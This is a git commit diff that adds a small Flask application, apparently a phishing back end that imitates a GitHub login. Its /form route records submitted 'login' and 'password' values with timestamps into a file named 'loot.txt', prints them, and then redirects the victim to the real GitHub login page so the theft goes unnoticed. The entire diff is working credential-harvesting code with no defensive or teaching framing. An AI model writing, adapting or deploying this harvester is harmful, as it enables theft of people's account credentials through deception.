a3a7db6303bdb3fdd21bca1c4223112b97e4a15c
Ubuntu <gh0st@tun.zvdm3jrudiielhwx3jq3o1o33d.jnbx.internal.cloudapp.net>
2019-06-01 12:55:46 +0000

    Modifications

---
+++ app/app.py
@@ -0,0 +1,39 @@
+import time
+
+from flask import Flask
+from flask import abort
+from flask import request
+from flask import redirect
+from flask import render_template
+from flask.ext.script import Manager
+
+
+app = Flask(__name__)
+manager = Manager(app)
+
+
+LOG_FILE = 'loot.txt'
+TO_LOG = ['login', 'password']
+REDIRECT_URL = 'https://www.github.com/login'
+
+
+@app.route('/form', methods=['POST'])
+def form():
+    with open(LOG_FILE, 'a') as f:
+        f.write(time.ctime() + '\n')
+        for i in TO_LOG:
+            if i in request.form:
+                log = i + ' = ' + request.form[i]
+                f.write(log + '\n')
+                print log
+        f.write('\n')
+    return "<script>window.location='" + REDIRECT_URL + "'</script>"
+
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+if __name__ == '__main__':
+    manager.run()
